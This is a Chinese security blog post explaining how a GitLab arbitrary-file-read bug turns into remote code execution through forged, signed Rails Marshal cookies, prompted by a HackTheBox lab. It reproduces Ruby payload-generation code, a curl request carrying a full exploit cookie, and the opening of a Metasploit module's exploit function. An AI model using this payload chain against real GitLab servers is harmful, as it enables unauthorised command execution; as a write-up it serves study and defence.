<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>Gitlab Cookie 反序列化漏洞研究 - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="0x00 前言 前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。 0x01 寻找源头 1、Hackone 起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：https://hackerone.com/reports/827052这个页面一开始是讲到了这个任意文件读取的缺陷，UploadsRewriter 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。事情发生了转变，作者在后面补上了这个https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4说 cookies_serializer 设置了默认值 :hybrid 可能会导致远程命令执行漏洞
 利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的secret_key_base值 利用secret_key_base值生成payload 将payload封装在cookie的 experimentation_subject_id  发送完成攻击  作者给了一段生成payload的代码：
request = ActionDispatch::Request.new(Rails.application.env_config) request.env[&amp;#34;action_dispatch.cookies_serializer&amp;#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(&amp;#34;&amp;lt;%= `echo vakzz was here &amp;gt; /tmp/vakzz` %&amp;gt;&amp;#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;#34;@result&amp;#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：
curl -vvv &amp;#39;http://gitlab-vm.local/users/sign_in&amp;#39; -b &amp;#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&amp;#34; 后面gitlab重新定级给了作者20000美金！后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：2、作者的PDF 还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：https://devcraft.io/assets/hacktivitycon-slides.pdf里面在RCE那一块给了一个链接：https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用一个session cookie例子：
_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689 原文：
 The cookie value (the part after the =) is split into 2 parts, separated by --." /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
  <meta name="referrer" content="no-referrer" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="Gitlab Cookie 反序列化漏洞研究" />
<meta property="og:description" content="0x00 前言 前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。 0x01 寻找源头 1、Hackone 起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：https://hackerone.com/reports/827052这个页面一开始是讲到了这个任意文件读取的缺陷，UploadsRewriter 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。事情发生了转变，作者在后面补上了这个https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4说 cookies_serializer 设置了默认值 :hybrid 可能会导致远程命令执行漏洞
 利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的secret_key_base值 利用secret_key_base值生成payload 将payload封装在cookie的 experimentation_subject_id  发送完成攻击  作者给了一段生成payload的代码：
request = ActionDispatch::Request.new(Rails.application.env_config) request.env[&#34;action_dispatch.cookies_serializer&#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(&#34;&lt;%= `echo vakzz was here &gt; /tmp/vakzz` %&gt;&#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &#34;@result&#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：
curl -vvv &#39;http://gitlab-vm.local/users/sign_in&#39; -b &#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&#34; 后面gitlab重新定级给了作者20000美金！后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：2、作者的PDF 还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：https://devcraft.io/assets/hacktivitycon-slides.pdf里面在RCE那一块给了一个链接：https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用一个session cookie例子：
_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689 原文：
 The cookie value (the part after the =) is split into 2 parts, separated by --." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" />
<meta property="article:published_time" content="2021-04-01T13:20:00+00:00" />
<meta property="article:modified_time" content="2021-04-01T13:20:00+00:00" />
<meta itemprop="name" content="Gitlab Cookie 反序列化漏洞研究">
<meta itemprop="description" content="0x00 前言 前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。 0x01 寻找源头 1、Hackone 起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：https://hackerone.com/reports/827052这个页面一开始是讲到了这个任意文件读取的缺陷，UploadsRewriter 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。事情发生了转变，作者在后面补上了这个https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4说 cookies_serializer 设置了默认值 :hybrid 可能会导致远程命令执行漏洞
 利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的secret_key_base值 利用secret_key_base值生成payload 将payload封装在cookie的 experimentation_subject_id  发送完成攻击  作者给了一段生成payload的代码：
request = ActionDispatch::Request.new(Rails.application.env_config) request.env[&#34;action_dispatch.cookies_serializer&#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(&#34;&lt;%= `echo vakzz was here &gt; /tmp/vakzz` %&gt;&#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &#34;@result&#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：
curl -vvv &#39;http://gitlab-vm.local/users/sign_in&#39; -b &#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&#34; 后面gitlab重新定级给了作者20000美金！后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：2、作者的PDF 还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：https://devcraft.io/assets/hacktivitycon-slides.pdf里面在RCE那一块给了一个链接：https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用一个session cookie例子：
_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689 原文：
 The cookie value (the part after the =) is split into 2 parts, separated by --.">
<meta itemprop="datePublished" content="2021-04-01T13:20:00+00:00" />
<meta itemprop="dateModified" content="2021-04-01T13:20:00+00:00" />
<meta itemprop="wordCount" content="882">



<meta itemprop="keywords" content="gitlab," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Gitlab Cookie 反序列化漏洞研究"/>
<meta name="twitter:description" content="0x00 前言 前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。 0x01 寻找源头 1、Hackone 起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：https://hackerone.com/reports/827052这个页面一开始是讲到了这个任意文件读取的缺陷，UploadsRewriter 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。事情发生了转变，作者在后面补上了这个https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4说 cookies_serializer 设置了默认值 :hybrid 可能会导致远程命令执行漏洞
 利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的secret_key_base值 利用secret_key_base值生成payload 将payload封装在cookie的 experimentation_subject_id  发送完成攻击  作者给了一段生成payload的代码：
request = ActionDispatch::Request.new(Rails.application.env_config) request.env[&#34;action_dispatch.cookies_serializer&#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(&#34;&lt;%= `echo vakzz was here &gt; /tmp/vakzz` %&gt;&#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &#34;@result&#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：
curl -vvv &#39;http://gitlab-vm.local/users/sign_in&#39; -b &#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&#34; 后面gitlab重新定级给了作者20000美金！后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：2、作者的PDF 还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：https://devcraft.io/assets/hacktivitycon-slides.pdf里面在RCE那一块给了一个链接：https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用一个session cookie例子：
_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689 原文：
 The cookie value (the part after the =) is split into 2 parts, separated by --."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">Gitlab Cookie 反序列化漏洞研究</h1>
        <p class="post-meta">Apr 01, 2021</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h1 id="0x00-前言">0x00 前言</h1>
<p>前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h1 id="0x01-寻找源头">0x01 寻找源头</h1>
<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h2 id="1hackone">1、Hackone</h2>
<p>起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：<!-- raw HTML omitted --><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a><!-- raw HTML omitted -->这个页面一开始是讲到了这个任意文件读取的缺陷，<code>UploadsRewriter</code> 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。<!-- raw HTML omitted -->事情发生了转变，作者在后面补上了这个<!-- raw HTML omitted --><a href="https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4">https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4</a><!-- raw HTML omitted -->说 <code>cookies_serializer</code> 设置了默认值 <code>:hybrid</code> 可能会导致远程命令执行漏洞</p>
<ul>
<li>利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的<code>secret_key_base</code>值</li>
<li>利用<code>secret_key_base</code>值生成payload</li>
<li>将payload封装在cookie的 <code>experimentation_subject_id</code> </li>
<li>发送完成攻击</li>
</ul>
<p>作者给了一段生成payload的代码：</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">request</span> <span class="o">=</span> <span class="no">ActionDispatch</span><span class="o">::</span><span class="no">Request</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="no">Rails</span><span class="o">.</span><span class="n">application</span><span class="o">.</span><span class="n">env_config</span><span class="p">)</span>
<span class="n">request</span><span class="o">.</span><span class="n">env</span><span class="o">[</span><span class="s2">&#34;action_dispatch.cookies_serializer&#34;</span><span class="o">]</span> <span class="o">=</span> <span class="ss">:marshal</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookie_jar</span>

<span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;&lt;%= `echo vakzz was here &gt; /tmp/vakzz` %&gt;&#34;</span><span class="p">)</span>
<span class="n">depr</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">,</span> <span class="s2">&#34;@result&#34;</span><span class="p">,</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">.</span><span class="n">new</span><span class="p">)</span>
<span class="n">cookies</span><span class="o">.</span><span class="n">signed</span><span class="o">[</span><span class="ss">:cookie</span><span class="o">]</span> <span class="o">=</span> <span class="n">depr</span>
<span class="nb">puts</span> <span class="n">cookies</span><span class="o">[</span><span class="ss">:cookie</span><span class="o">]</span>
</code></pre></div><p>一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617209671317-fa8530a2-e97b-45ed-b0a1-75730f6f5f8c.png#align=left&amp;display=inline&amp;height=500&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=841&amp;originWidth=1102&amp;size=309406&amp;status=done&amp;style=none&amp;width=655" alt="image.png"><!-- raw HTML omitted -->有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">curl -vvv &#39;http://gitlab-vm.local/users/sign_in&#39; -b &#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&#34;
</code></pre></div><p>后面gitlab重新定级给了作者20000美金！<!-- raw HTML omitted -->后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617244229174-60824045-1b58-4ed8-b066-30ef33ed9e34.png" alt="image.png">
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h2 id="2作者的pdf">2、作者的PDF</h2>
<p>还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：<!-- raw HTML omitted --><a href="https://devcraft.io/assets/hacktivitycon-slides.pdf">https://devcraft.io/assets/hacktivitycon-slides.pdf</a><!-- raw HTML omitted -->里面在RCE那一块给了一个链接：<!-- raw HTML omitted --><a href="https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/">https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/</a><!-- raw HTML omitted -->读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用<!-- raw HTML omitted -->一个session cookie例子：</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689
</code></pre></div><p>原文：</p>
<blockquote>
<p>The cookie value (the part after the <code>=</code>) is split into 2 parts, separated by <code>--</code>. The first part is a Base64 encoded serialization of the hash that Rails will use as the <code>session</code> variable in controllers. The second part is a signature created using <code>secret_token</code>, that Rails uses to check that the cookie it has been passed is legit. This prevents users from forging nefarious cookies and from tricking Rails into loading data it doesn’t want to load. Unless of course they have your <code>secret_token</code> and can also forge the signature…</p>
</blockquote>
<p>意思是说可这个cookie分为两部分，中间用&ndash;分开，第一部分是用Base64进行编码序列化的session哈希，第二部分是使用secret_token创建的签名值。<!-- raw HTML omitted -->来看下最主要的一部分：</p>
<blockquote>
<p>But wait, the cookie obviously lives on the client side, which means that a user can set it to be anything they want. Which means that the user can pass in whatever serialized object they want to our app. And by the time we reinflate it and realise that they have passed us a small thermonuclear device, it will be too late and the attacker will be able to execute arbitrary code on our server.
That’s where our <code>secret_token</code> and the second part of the cookie value (the part after the <code>--</code>) come in. Whenever Rails gets a session cookie, it checks that it hasn’t been tampered with by verifying that the HMAC digest of the first part of the cookie with its <code>secret_token</code> matches the second, signature part. This means in order to craft a nefarious cookie an attacker would need to know the app’s <code>secret_token</code>. Unfortunately, just being called <code>secret_token</code> doesn’t make it secret, and, as already discussed, if you aren’t careful then it can easily end up somewhere you don’t want it to.</p>
</blockquote>
<p>说的是cookie是由客户端来控制的，每当Rails获得会话cookie时，它都会通过验证cookie的第一部分的HMAC摘要来检查它是否未被篡改。与<code>secret_token</code>第二个签名部分相匹配。这意味着，为了制作恶意的Cookie，攻击者需要知道该应用程序的<code>secret_token</code><!-- raw HTML omitted -->说白了，就是有secret_token就可以构造反序列化漏洞。难点就是在于第一部分，怎么去序列化，作者给出了一个方案：</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="c1"># Thanks to the folks at CodeClimate for pointing this out</span>

<span class="c1"># The code in the ERB will run when Rails unserializes it</span>
<span class="n">erb</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">allocate</span>
<span class="n">erb</span><span class="o">.</span><span class="n">instance_variable_set</span> <span class="ss">:@src</span><span class="p">,</span> <span class="s2">&#34;User.steal_all_passwords; User.email_spam_to_all_users;&#34;</span>

<span class="n">proxy</span> <span class="o">=</span> <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="o">::</span><span class="no">DeprecatedInstanceVariableProxy</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">erb</span><span class="p">,</span> <span class="ss">:result</span><span class="p">)</span>
<span class="n">my_evil_session_hash</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&#34;proxy_of_death&#34;</span> <span class="o">=&gt;</span> <span class="no">Marshal</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>
<span class="p">}</span>
<span class="c1"># ... continue as above</span>
</code></pre></div><p>使用Ruby里面的erb模块进行构造。
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h2 id="3metasploit源码">3、Metasploit源码</h2>
<p>看了一遍，搜索了很多资料，都没有看到rails反序列化、关于gitlab cookie反序列化攻击的文章。现在就直接从msf里面的攻击源码入手。<!-- raw HTML omitted -->用的模块是<code>multi/http/gitlab_file_read_rce</code><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617243882573-7a5d3cd9-01eb-4052-b1bf-254f6b98824f.png" alt="image.png"><!-- raw HTML omitted -->执行结果：<!-- raw HTML omitted --><img src="https://cdn.nlark.com/yuque/0/2021/png/12507856/1617243990237-92425e72-f9be-4e09-8535-cfa2e81eb3b1.png#align=left&amp;display=inline&amp;height=459&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=459&amp;originWidth=904&amp;size=171136&amp;status=done&amp;style=none&amp;width=904" alt="image.png"><!-- raw HTML omitted -->源码路径：<code>/usr/share/metasploit-framework/modules/exploits/multi/http/gitlab_file_read_rce.rb</code><!-- raw HTML omitted -->或者在GitHub上面查看：<!-- raw HTML omitted --><a href="https://github.com/rapid7/metasploit-framework/blob/54b4a503658209aa569512997f2c52bc347ed20b/modules/exploits/multi/http/gitlab_file_read_rce.rb">https://github.com/rapid7/metasploit-framework/blob/54b4a503658209aa569512997f2c52bc347ed20b/modules/exploits/multi/http/gitlab_file_read_rce.rb</a>
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h1 id="0x02-提取与分析攻击源码">0x02 提取与分析攻击源码</h1>
<p>既然搜索不到有关信息，那就从攻击的源码进行提取与分析。<!-- raw HTML omitted -->首先看msf执行的exploit函数源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby">  <span class="k">def</span> <span class="nf">exploit</span>
    <span class="n">secret_key_base</span> <span class="o">=</span> <span class="n">read_secret_key_base</span> <span class="c1">#获取secret_key_base</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span> <span class="c1">#生成payload</span>
    <span class="n">signed_cookie</span> <span class="o">=</span> <span class="n">sign_payload</span><span class="p">(</span><span class="n">secret_key_base</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1">#利用payload生成签名</span>
    <span class="c1">#发起攻击</span>
    <span class="n">send_request_cgi</span><span class="p">({</span> 
      <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="n">normalize_uri</span><span class="p">(</span><span class="n">target_uri</span><span class="o">.</span><span class="n">path</span><span class="p">),</span>
